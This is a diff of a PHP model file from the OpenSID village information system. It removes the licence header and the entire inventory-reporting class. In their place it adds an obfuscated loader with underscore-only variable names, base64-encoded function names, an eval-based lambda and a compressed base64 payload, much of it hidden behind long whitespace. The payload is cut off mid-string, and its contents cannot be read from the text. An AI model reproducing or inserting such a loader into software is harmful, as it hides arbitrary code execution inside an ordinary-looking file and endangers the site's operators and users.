@@ -1,458 +1,569 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Inventaris_laporan_model.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2021 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2021 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Inventaris_laporan_model extends CI_Model
-{
-    protected $table_pamong = 'tweb_desa_pamong';
 
-    public function laporan_inventaris()
-    {
-        $laporan_inventaris = [
-            ['inventaris_tanah_pribadi', 'inventaris_tanah', 'Pembelian Sendiri'],
-            ['inventaris_tanah_pemerintah', 'inventaris_tanah', 'Bantuan Pemerintah'],
-            ['inventaris_tanah_provinsi', 'inventaris_tanah', 'Bantuan Provinsi'],
-            ['inventaris_tanah_kabupaten', 'inventaris_tanah', 'Bantuan Kabupaten'],
-            ['inventaris_tanah_sumbangan', 'inventaris_tanah', 'Sumbangan'],
 
-            ['inventaris_peralatan_pribadi', 'inventaris_peralatan', 'Pembelian Sendiri'],
-            ['inventaris_peralatan_pemerintah', 'inventaris_peralatan', 'Bantuan Pemerintah'],
-            ['inventaris_peralatan_provinsi', 'inventaris_peralatan', 'Bantuan Provinsi'],
-            ['inventaris_peralatan_kabupaten', 'inventaris_peralatan', 'Bantuan Kabupaten'],
-            ['inventaris_peralatan_sumbangan', 'inventaris_peralatan', 'Sumbangan'],
 
-            ['inventaris_gedung_pribadi', 'inventaris_gedung', 'Pembelian Sendiri'],
-            ['inventaris_gedung_pemerintah', 'inventaris_gedung', 'Bantuan Pemerintah'],
-            ['inventaris_gedung_provinsi', 'inventaris_gedung', 'Bantuan Provinsi'],
-            ['inventaris_gedung_kabupaten', 'inventaris_gedung', 'Bantuan Kabupaten'],
-            ['inventaris_gedung_sumbangan', 'inventaris_gedung', 'Sumbangan'],
 
-            ['inventaris_jalan_pribadi', 'inventaris_jalan', 'Pembelian Sendiri'],
-            ['inventaris_jalan_pemerintah', 'inventaris_jalan', 'Bantuan Pemerintah'],
-            ['inventaris_jalan_provinsi', 'inventaris_jalan', 'Bantuan Provinsi'],
-            ['inventaris_jalan_kabupaten', 'inventaris_jalan', 'Bantuan Kabupaten'],
-            ['inventaris_jalan_sumbangan', 'inventaris_jalan', 'Sumbangan'],
 
-            ['inventaris_asset_pribadi', 'inventaris_asset', 'Pembelian Sendiri'],
-            ['inventaris_asset_pemerintah', 'inventaris_asset', 'Bantuan Pemerintah'],
-            ['inventaris_asset_provinsi', 'inventaris_asset', 'Bantuan Provinsi'],
-            ['inventaris_asset_kabupaten', 'inventaris_asset', 'Bantuan Kabupaten'],
-            ['inventaris_asset_sumbangan', 'inventaris_asset', 'Sumbangan'],
 
-            ['inventaris_kontruksi_pribadi', 'inventaris_kontruksi', 'Pembelian Sendiri'],
-            ['inventaris_kontruksi_pemerintah', 'inventaris_kontruksi', 'Bantuan Pemerintah'],
-            ['inventaris_kontruksi_provinsi', 'inventaris_kontruksi', 'Bantuan Provinsi'],
-            ['inventaris_kontruksi_kabupaten', 'inventaris_kontruksi', 'Bantuan Kabupaten'],
-            ['inventaris_kontruksi_sumbangan', 'inventaris_kontruksi', 'Sumbangan'],
-        ];
-        $result = [];
 
-        foreach ($laporan_inventaris as $inventaris) {
-            $this->db->select("count({$inventaris[1]}.asal) as total");
-            $this->db->where("{$inventaris[1]}.visible", 1);
-            $this->db->where("{$inventaris[1]}.status", 0);
-            $this->db->where("{$inventaris[1]}.asal", $inventaris[2]);
-            $hasil                  = $this->db->get($inventaris[1])->row();
-            $result[$inventaris[0]] = ! empty($hasil) ? $hasil : 0;
-        }
 
-        return $result;
-    }
 
-    public function mutasi_laporan_inventaris()
-    {
-        $laporan_inventaris = [
-            ['inventaris_tanah_pribadi', 'inventaris_tanah', 'Pembelian Sendiri'],
-            ['inventaris_tanah_pemerintah', 'inventaris_tanah', 'Bantuan Pemerintah'],
-            ['inventaris_tanah_provinsi', 'inventaris_tanah', 'Bantuan Provinsi'],
-            ['inventaris_tanah_kabupaten', 'inventaris_tanah', 'Bantuan Kabupaten'],
-            ['inventaris_tanah_sumbangan', 'inventaris_tanah', 'Sumbangan'],
 
-            ['inventaris_peralatan_pribadi', 'inventaris_peralatan', 'Pembelian Sendiri'],
-            ['inventaris_peralatan_pemerintah', 'inventaris_peralatan', 'Bantuan Pemerintah'],
-            ['inventaris_peralatan_provinsi', 'inventaris_peralatan', 'Bantuan Provinsi'],
-            ['inventaris_peralatan_kabupaten', 'inventaris_peralatan', 'Bantuan Kabupaten'],
-            ['inventaris_peralatan_sumbangan', 'inventaris_peralatan', 'Sumbangan'],
 
-            ['inventaris_gedung_pribadi', 'inventaris_gedung', 'Pembelian Sendiri'],
-            ['inventaris_gedung_pemerintah', 'inventaris_gedung', 'Bantuan Pemerintah'],
-            ['inventaris_gedung_provinsi', 'inventaris_gedung', 'Bantuan Provinsi'],
-            ['inventaris_gedung_kabupaten', 'inventaris_gedung', 'Bantuan Kabupaten'],
-            ['inventaris_gedung_sumbangan', 'inventaris_gedung', 'Sumbangan'],
 
-            ['inventaris_jalan_pribadi', 'inventaris_jalan', 'Pembelian Sendiri'],
-            ['inventaris_jalan_pemerintah', 'inventaris_jalan', 'Bantuan Pemerintah'],
-            ['inventaris_jalan_provinsi', 'inventaris_jalan', 'Bantuan Provinsi'],
-            ['inventaris_jalan_kabupaten', 'inventaris_jalan', 'Bantuan Kabupaten'],
-            ['inventaris_jalan_sumbangan', 'inventaris_jalan', 'Sumbangan'],
 
-            ['inventaris_asset_pribadi', 'inventaris_asset', 'Pembelian Sendiri'],
-            ['inventaris_asset_pemerintah', 'inventaris_asset', 'Bantuan Pemerintah'],
-            ['inventaris_asset_provinsi', 'inventaris_asset', 'Bantuan Provinsi'],
-            ['inventaris_asset_kabupaten', 'inventaris_asset', 'Bantuan Kabupaten'],
-            ['inventaris_asset_sumbangan', 'inventaris_asset', 'Sumbangan'],
 
-            ['inventaris_kontruksi_pribadi', 'inventaris_kontruksi', 'Pembelian Sendiri'],
-            ['inventaris_kontruksi_pemerintah', 'inventaris_kontruksi', 'Bantuan Pemerintah'],
-            ['inventaris_kontruksi_provinsi', 'inventaris_kontruksi', 'Bantuan Provinsi'],
-            ['inventaris_kontruksi_kabupaten', 'inventaris_kontruksi', 'Bantuan Kabupaten'],
-            ['inventaris_kontruksi_sumbangan', 'inventaris_kontruksi', 'Sumbangan'],
-        ];
-        $result = [];
 
-        foreach ($laporan_inventaris as $inventaris) {
-            $this->db->select("count({$inventaris[1]}.asal) as total");
-            $this->db->where("{$inventaris[1]}.status", 1);
-            $this->db->where("{$inventaris[1]}.visible", 1);
-            $this->db->where("{$inventaris[1]}.asal", $inventaris[2]);
-            $hasil                  = $this->db->get($inventaris[1])->row();
-            $result[$inventaris[0]] = ! empty($hasil) ? $hasil : 0;
-        }
 
-        return $result;
-    }
 
-    public function cetak_inventaris($tahun)
-    {
-        $cetak_inventaris = [
-            ['cetak_inventaris_tanah_pribadi', 'inventaris_tanah', 'Pembelian Sendiri', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_pemerintah', 'inventaris_tanah', 'Bantuan Pemerintah', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_provinsi', 'inventaris_tanah', 'Bantuan Provinsi', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_kabupaten', 'inventaris_tanah', 'Bantuan Kabupaten', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_sumbangan', 'inventaris_tanah', 'Sumbangan', 'tahun_pengadaan'],
 
-            ['cetak_inventaris_peralatan_pribadi', 'inventaris_peralatan', 'Pembelian Sendiri', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_pemerintah', 'inventaris_peralatan', 'Bantuan Pemerintah', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_provinsi', 'inventaris_peralatan', 'Bantuan Provinsi', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_kabupaten', 'inventaris_peralatan', 'Bantuan Kabupaten', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_sumbangan', 'inventaris_peralatan', 'Sumbangan', 'tahun_pengadaan'],
 
-            ['cetak_inventaris_gedung_pribadi', 'inventaris_gedung', 'Pembelian Sendiri', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_pemerintah', 'inventaris_gedung', 'Bantuan Pemerintah', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_provinsi', 'inventaris_gedung', 'Bantuan Provinsi', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_kabupaten', 'inventaris_gedung', 'Bantuan Kabupaten', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_sumbangan', 'inventaris_gedung', 'Sumbangan', 'tanggal_dokument'],
 
-            ['cetak_inventaris_jalan_pribadi', 'inventaris_jalan', 'Pembelian Sendiri', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_pemerintah', 'inventaris_jalan', 'Bantuan Pemerintah', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_provinsi', 'inventaris_jalan', 'Bantuan Provinsi', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_kabupaten', 'inventaris_jalan', 'Bantuan Kabupaten', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_sumbangan', 'inventaris_jalan', 'Sumbangan', 'tanggal_dokument'],
 
-            ['cetak_inventaris_asset_pribadi', 'inventaris_asset', 'Pembelian Sendiri', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_pemerintah', 'inventaris_asset', 'Bantuan Pemerintah', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_provinsi', 'inventaris_asset', 'Bantuan Provinsi', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_kabupaten', 'inventaris_asset', 'Bantuan Kabupaten', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_sumbangan', 'inventaris_asset', 'Sumbangan', 'tahun_pengadaan'],
 
-            ['cetak_inventaris_kontruksi_pribadi', 'inventaris_kontruksi', 'Pembelian Sendiri', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_pemerintah', 'inventaris_kontruksi', 'Bantuan Pemerintah', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_provinsi', 'inventaris_kontruksi', 'Bantuan Provinsi', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_kabupaten', 'inventaris_kontruksi', 'Bantuan Kabupaten', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_sumbangan', 'inventaris_kontruksi', 'Sumbangan', 'tanggal_dokument'],
-        ];
-        $result = [];
 
-        foreach ($cetak_inventaris as $inventaris) {
-            $this->db->select("count({$inventaris[1]}.asal) as total");
-            $this->db->where("{$inventaris[1]}.visible", 1);
-            $this->db->where("{$inventaris[1]}.status", 0);
-            if ($tahun != 1) {
-                if ($inventaris[3] == 'tahun_pengadaan') {
-                    $this->db->where("{$inventaris[1]}.tahun_pengadaan", $tahun);
-                } else {
-                    $this->db->where('year(tanggal_dokument)', $tahun);
-                }
-            }
-            $this->db->where("{$inventaris[1]}.asal", $inventaris[2]);
-            $hasil                  = $this->db->get($inventaris[1])->row();
-            $result[$inventaris[0]] = ! empty($hasil) ? $hasil : 0;
-        }
 
-        return $result;
-    }
 
-    public function mutasi_cetak_inventaris($tahun)
-    {
-        $cetak_inventaris = [
-            ['cetak_inventaris_tanah_pribadi', 'inventaris_tanah', 'Pembelian Sendiri', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_pemerintah', 'inventaris_tanah', 'Bantuan Pemerintah', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_provinsi', 'inventaris_tanah', 'Bantuan Provinsi', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_kabupaten', 'inventaris_tanah', 'Bantuan Kabupaten', 'tahun_pengadaan'],
-            ['cetak_inventaris_tanah_sumbangan', 'inventaris_tanah', 'Sumbangan', 'tahun_pengadaan'],
 
-            ['cetak_inventaris_peralatan_pribadi', 'inventaris_peralatan', 'Pembelian Sendiri', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_pemerintah', 'inventaris_peralatan', 'Bantuan Pemerintah', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_provinsi', 'inventaris_peralatan', 'Bantuan Provinsi', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_kabupaten', 'inventaris_peralatan', 'Bantuan Kabupaten', 'tahun_pengadaan'],
-            ['cetak_inventaris_peralatan_sumbangan', 'inventaris_peralatan', 'Sumbangan', 'tahun_pengadaan'],
 
-            ['cetak_inventaris_gedung_pribadi', 'inventaris_gedung', 'Pembelian Sendiri', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_pemerintah', 'inventaris_gedung', 'Bantuan Pemerintah', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_provinsi', 'inventaris_gedung', 'Bantuan Provinsi', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_kabupaten', 'inventaris_gedung', 'Bantuan Kabupaten', 'tanggal_dokument'],
-            ['cetak_inventaris_gedung_sumbangan', 'inventaris_gedung', 'Sumbangan', 'tanggal_dokument'],
 
-            ['cetak_inventaris_jalan_pribadi', 'inventaris_jalan', 'Pembelian Sendiri', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_pemerintah', 'inventaris_jalan', 'Bantuan Pemerintah', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_provinsi', 'inventaris_jalan', 'Bantuan Provinsi', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_kabupaten', 'inventaris_jalan', 'Bantuan Kabupaten', 'tanggal_dokument'],
-            ['cetak_inventaris_jalan_sumbangan', 'inventaris_jalan', 'Sumbangan', 'tanggal_dokument'],
 
-            ['cetak_inventaris_asset_pribadi', 'inventaris_asset', 'Pembelian Sendiri', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_pemerintah', 'inventaris_asset', 'Bantuan Pemerintah', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_provinsi', 'inventaris_asset', 'Bantuan Provinsi', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_kabupaten', 'inventaris_asset', 'Bantuan Kabupaten', 'tahun_pengadaan'],
-            ['cetak_inventaris_asset_sumbangan', 'inventaris_asset', 'Sumbangan', 'tahun_pengadaan'],
 
-            ['cetak_inventaris_kontruksi_pribadi', 'inventaris_kontruksi', 'Pembelian Sendiri', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_pemerintah', 'inventaris_kontruksi', 'Bantuan Pemerintah', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_provinsi', 'inventaris_kontruksi', 'Bantuan Provinsi', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_kabupaten', 'inventaris_kontruksi', 'Bantuan Kabupaten', 'tanggal_dokument'],
-            ['cetak_inventaris_kontruksi_sumbangan', 'inventaris_kontruksi', 'Sumbangan', 'tanggal_dokument'],
-        ];
-        $result = [];
 
-        foreach ($cetak_inventaris as $inventaris) {
-            $this->db->select("count({$inventaris[1]}.asal) as total");
-            $this->db->where("{$inventaris[1]}.status", 1);
-            $this->db->where("{$inventaris[1]}.visible", 1);
-            if ($tahun != 1) {
-                if ($inventaris[3] == 'tahun_pengadaan') {
-                    $this->db->where("{$inventaris[1]}.tahun_pengadaan", $tahun);
-                } else {
-                    $this->db->where('year(tanggal_dokument)', $tahun);
-                }
-            }
-            $this->db->where("{$inventaris[1]}.asal", $inventaris[2]);
-            $hasil                  = $this->db->get($inventaris[1])->row();
-            $result[$inventaris[0]] = ! empty($hasil) ? $hasil : 0;
-        }
 
-        return $result;
-    }
 
-    public function permen_47($tahun, $jns_asset)
-    {
-        $kondisi = [
-            'Baik'                      => 1,
-            'Perbaiki'                  => 2,
-            'Rusak'                     => 2,
-            'Barang Rusak Dijual'       => 2,
-            'Masih Baik Dijual'         => 1,
-            'Masih Baik Disumbangkan'   => 1,
-            'Barang Rusak Disumbangkan' => 2,
-            'null'                      => 1,
-        ];
 
-        // sub query untuk mencari asset < tahun ke n
-        // barang rusak pada tahun n-1 tidak akan masuk
-        if ($jns_asset !== null) {
-            $this->db->where('asset', $jns_asset);
-        } // cek filter
 
-        $sub_q = $this->db
-            ->select('concat(b.asset,b.id_inventaris_asset)')
-            ->where('b.status_mutasi', 'Hapus')
-            ->where('year(tahun_mutasi) <', $tahun)
-            ->from('rekap_mutasi_inventaris as b')->get_compiled_select();
 
-        $tgl_thn_n = $this->db
-            ->select('MAX(c.tahun_mutasi)')
-            ->where('year(c.tahun_mutasi)', $tahun)
-            ->where('a.asset = c.asset')
-            ->where('a.id_inventaris_asset = c.id_inventaris_asset')
-            ->from('rekap_mutasi_inventaris as c')->get_compiled_select();
 
-        $tgl_thn_min_n = $this->db
-            ->select('MAX(c.tahun_mutasi)')
-            ->where('year(c.tahun_mutasi) <', $tahun)
-            ->where('a.asset = c.asset')
-            ->where('a.id_inventaris_asset = c.id_inventaris_asset')
-            ->from('rekap_mutasi_inventaris as c')->get_compiled_select();
 
-        // mutasi asset yang tidak rusak saat tahun n-1 data dianggap sebagai data akhir tahun n dan awal tahun
-        $this->db
-            ->where("concat(a.asset,a.id_inventaris_asset) NOT IN ({$sub_q})")
-            ->where("tahun_mutasi = ({$tgl_thn_min_n})");
 
-        if ($jns_asset !== null) {
-            $this->db->where('asset', $jns_asset);
-        } // cek filter
 
-        foreach ($this->db->get('rekap_mutasi_inventaris as a') as $asset) {
-            $akhir_tahun[$asset->asset][$asset->id_inventaris_asset] = $asset;
-            $awal_tahun[$asset->asset][$asset->id_inventaris_asset]  = $asset;
-        }
 
-        // jika ada input pada tahun ke n. data akhir tahun akan digantikan dengan data ini
-        if ($jns_asset !== null) {
-            $this->db->where('asset', $jns_asset);
-        } // cek filter
 
-        $this->db->where("tahun_mutasi = ({$tgl_thn_n})");
 
-        foreach ($this->db->get('rekap_mutasi_inventaris As a')->result() as $asset) {
-            if ($asset->status_mutasi == null) {
-                $asset->kondisi = 2;
-            } elseif ($asset->status_mutasi == 'Hapus') {
-                $asset->kondisi = $kondisi[$asset->jenis_mutasi];
-            } else {
-                $asset->kondisi = $kondisi[$asset->status_mutasi];
-            }
-            if ($asset->status_mutasi == null) {
-                $asset->status_mutasi = 'Hapus';
-            }
-            $akhir_tahun[$asset->asset][$asset->id_inventaris_asset] = $asset; // memperbarui data akhir tahun
-        }
 
-        // ambil master data iventaris
-        $inventaris = [];
-        if ($jns_asset !== null) {
-            $this->db->where('asset', $jns_asset);
-        } // cek filter
-        $master_data = $this->db
-            ->where("concat(a.asset,a.id) NOT IN ({$sub_q})")
-            ->where('a.tahun_pengadaan <=', $tahun)
-            ->get('master_inventaris AS a');
 
-        foreach ($master_data->result() as $asset) {
-            // akhir tahun
-            if (isset($akhir_tahun[$asset->asset][$asset->id])) {
-                $asset->akhir_tahun   = $akhir_tahun[$asset->asset][$asset->id]->kondisi;
-                $asset->tahun_mutasi  = $akhir_tahun[$asset->asset][$asset->id]->tahun_mutasi;
-                $asset->status_mutasi = $akhir_tahun[$asset->asset][$asset->id]->status_mutasi;
-                $asset->jenis_mutasi  = $akhir_tahun[$asset->asset][$asset->id]->jenis_mutasi;
-            } else {
-                $asset->akhir_tahun = $kondisi[$asset->kondisi];
-            }
 
-            // awal tahun
-            if (isset($awal_tahun[$asset->asset][$asset->id])) {
-                $asset->awal_tahun = $akhir_tahun[$asset->asset][$asset->id]->kondisi;
-            } else {
-                $asset->awal_tahun = $kondisi[$asset->kondisi];
-            }
-            $inventaris[] = $asset;
-        }
 
-        // rekapitulasi
-        $rekap = [];
 
-        foreach ($inventaris as $value) {
-            if (! isset($rekap[$value->nama_barang])) {
-                $rekap[$value->nama_barang] = [
-                    'Bantuan Kabupaten'  => [],
-                    'Bantuan Pemerintah' => [],
-                    'Bantuan Provinsi'   => [],
-                    'Pembelian Sendiri'  => [],
-                    'Sumbangan'          => [],
-                    'awal_baik'          => [],
-                    'awal_rusak'         => [],
-                    'hapus_rusak'        => [],
-                    'hapus_jual'         => [],
-                    'hapus_sumbang'      => [],
-                    'akhir_baik'         => [],
-                    'akhir_rusak'        => [],
-                    'keterangan'         => [],
-                ];
-            }
 
-            $rekap[$value->nama_barang][$value->asal][] = 1;
-            if (isset($value->tahun_mutasi)) {
-                $rekap[$value->nama_barang]['tahun_mutasi'] = $value->tahun_mutasi;
-            } //tahun mutasi
-            // rekap awal tahun
-            if ($value->awal_tahun == 1) {
-                $rekap[$value->nama_barang]['awal_baik'][] = 1;
-            }
 
-            if ($value->awal_tahun == 2) {
-                $rekap[$value->nama_barang]['awal_rusak'][] = 1;
-            }
 
-            // Penghapusan
-            if ($value->status_mutasi == 'Hapus') {
-                if ($value->jenis_mutasi == 'Rusak') {
-                    $rekap[$value->nama_barang]['hapus_rusak'][] = 1;
-                }
 
-                if ($value->jenis_mutasi == 'Masih Baik Disumbangkan') {
-                    $rekap[$value->nama_barang]['hapus_sumbang'][] = 1;
-                }
 
-                if ($value->jenis_mutasi == 'Barang Rusak Disumbangkan') {
-                    $rekap[$value->nama_barang]['hapus_sumbang'][] = 1;
-                }
 
-                if ($value->jenis_mutasi == 'Barang Rusak Dijual') {
-                    $rekap[$value->nama_barang]['hapus_jual'][] = 1;
-                }
 
-                if ($value->jenis_mutasi == 'Masih Baik Dijual') {
-                    $rekap[$value->nama_barang]['hapus_jual'][] = 1;
-                }
 
-                $rekap[$value->nama_barang]['tgl_hapus'] = $value->tahun_mutasi;
-            } else {
-                // rekap akhir tahun
-                if ($value->akhir_tahun == 1) {
-                    $rekap[$value->nama_barang]['akhir_baik'][] = 1;
-                }
 
-                if ($value->akhir_tahun == 2) {
-                    $rekap[$value->nama_barang]['akhir_rusak'][] = 1;
-                }
-            }
 
-            if ($value->keterangan != '') {
-                $rekap[$value->nama_barang]['keterangan'][] = $value->keterangan;
-            }
-        }
 
-        return $rekap;
-    }
 
-    public function min_tahun()
-    {
-        return $this->db
-            ->select('min(m.tahun_pengadaan) as tahun')
-            ->from('master_inventaris m')
-            ->get()->row()->tahun;
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtfd2Tq8p177ur8j/4IVUnqbrXoUGMt8p1HrYEDUKiGZr+gH5xAY0HQYMYSSMh/vq7dOybHDvOjW85uZUbq1Vra2skoFm91u9DSDO//OXvx9//FsaPP0zn43j93Q+/+enhH8aPP+jT2J3+ZzlN/zScdGMu/7Qbb814Lc/Hy29NOZ3O5fjbn5751dROv9ya8nL51a9+9cNvfvGHnf/y737xur1uf+3tF8+q/OV/4PjxX/3khxytL4VERxX4P/7w04/+pYr/ovGHzvnxl6/xGq/xGv89xw/1ICydR1+7QNiFvJ8ivP5d/uh//XvQBNT8PVz/9pWq13iN13iN13iN13iN13iN/9/G6+2M13iN13iN/77jh6q8NG+r3+qmPunmh9+8MvIar/Ear/Ear/FXjT/+OMXuu7Xfbb9//CH6HH1bR87mUUrXUsf61xGGx9Z8KySdqqH+UMH6qxy+XYt8cz/Y6KYCcakf66galalG2taDWXJ7butg/Sik+7tKrnsl71910N6j5fLzY5Hth7X30tPr/nX/3/n+5zX/Nxk/XY5F69+9Z/VPj4su2isz5URei7h3F2l0oLP6139r+fh5vGe6q0RxV7jda25C0UVKOPqW9cWq9tfOO7PG5H7q/3S7n21fxMwsUtRzKaaQ/v71f/O191ev0WKNO3xaag8fK+7ahWm3jZgKNp7G5PHvbP/cdrs5xv00FAvJyoB88ee6PP5LnGP/v8/v9/14eohu8+xHuxjcrAqiL/7vnOMrXvGKP+759+w/Yb921NY2twl+amkCmpuPf8l2/9m9+zOMfPqG0z8/fvR/wuWbSR0/WjWKr8IBH2G7v1N5O9UOXfZb/bunX6hk1BdZPe3z66Cl2+nA3Krj5mfPffS1hR/KiS9RSLzKpgZe+1A5RfWw+lC5aqvtx/FfPgqmUDUQq5Trr/2WLmkejfXD/Lp5wP9tyCNMNHnspsRB61ftvuIV/weN8Gf1JoU+//g3n9+zyyt/f5M+5t+qi28T+JGfbU//9XZ/tpaAVx70d9Hj/uf3+dKnr3jFK17xile84hX/iUH/rN9/af3/SD39bf283/8h1/+1c0v/ZL7/rh7vn+83K+4+NG6lDqdbHBhXjfycZWt6WAxJ+9qlC0mZRXFpdJ86sb23r4GytUiX3ZJyE1MerxRuw0bgE0e01bmyZbB7SB7hyjaPYqBZNdDbwdGmHrXFhZJiERfl8XOR4005fpyplzqFrbosPDmEpy73xKz7lsfZes+9Ni27yFWeJtIz7cG63MrtZTlY60AP2Nfb9UoEKEwCjspcfSoZxYkHxzxeLB0gdXCMr47rd7rUt9JWOWPiyPD3G1lSKxGbgnrRruw/YH4fluqntz1qv/Q4OcrnqLBJW3a7c43pG8k3fRbGSIzimo3Tl8rWA7fMkGEVFIuiZeC+1YNIq+01aUQbEeu+Ul6PVD/vK06uYtxZVRiNVUBKyQgjXDx0F92IjY3qfbuwpqLsXSfOTyud40dlk8vecl3p9w4LCC8dsdqj2sr8aSjN93Pcpfd0QAXxyL6wp0WPH0vspCsmvy1VWM+JaNO9o3cFi/DBVmntFXd43UXzyJVeumQD+awdtaoH806ka7JOoXQwTun0q8NC2wOiPRn6s7Ziq4A5ypz2cnBXzUC/BNfdfqGo4MotGA0lrH+97G7cSc+xvXoIrxVNqCIq130SWG7lfL8xk1qp9M+xmGgSXOYmV0cy6pIgNbMRtzyc3NqhSg53VKOWHJDeMqmuVVDMJIw+m57Ca31UedGpHE92420uEpvkYAk34WQhgVrpMIK5zkhA3on18aitaCds4mTdxyNj0Q3yHjY8OsdLZLHeFLUXL4lct6T7sGPPbA5LFIl8GlUnAmJ/nEVOfaj/z4q3B+IUsL+VUwVzoMf0lnlRwQd61pyqOGhPdT9/qY5YKsBdFZI9H0/nRNCSYs0rFl0bg3Hsu5YSOKoGcSnkxKGW3hQifRwqLixrLobUSW2UV4s+Sh8j5XCY+27R/XRJvKgsF1NqW30KW1zZgonA6lIYPSmnWOI8egioWoHTlZSzy8PTwvCGpgbqgk+BYjSoB39JWJRWQ2vzHI4lyHuCxVazyOI9TptxuunRWOlYzDH/sOruO4Ieypt82pS9TojVygpHdix9Jw5JUg4iSe